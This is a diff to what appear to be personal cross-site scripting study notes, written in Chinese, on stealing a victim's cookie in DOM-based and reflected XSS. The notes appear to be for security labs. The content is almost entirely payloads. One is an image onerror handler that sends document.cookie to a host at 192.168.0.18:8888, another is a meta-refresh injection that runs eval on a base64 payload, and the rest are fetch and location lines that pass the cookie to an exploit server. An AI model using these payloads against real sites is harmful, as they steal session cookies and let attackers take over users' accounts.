@@ -61,6 +61,9 @@ How to get victim's cookie?
 对于DOM和Reflected来说，因为payload是放在url中的，所以通常使用下面这些方法来传递cookie.
 1. fetch('exploit_server/?document.cookie()')
 2. location='https://lab/?query=(document.location="https://exploitserver/?document.cookie")
+3. <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
+4. <!-- ALL TOGETHER BELOW-->
+<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
 
 Stored xss因为通常可以写比较长的js，所以功能会相对比较丰富。当然DOM/Reflected的方法也可以用。
 XSS + CSRF
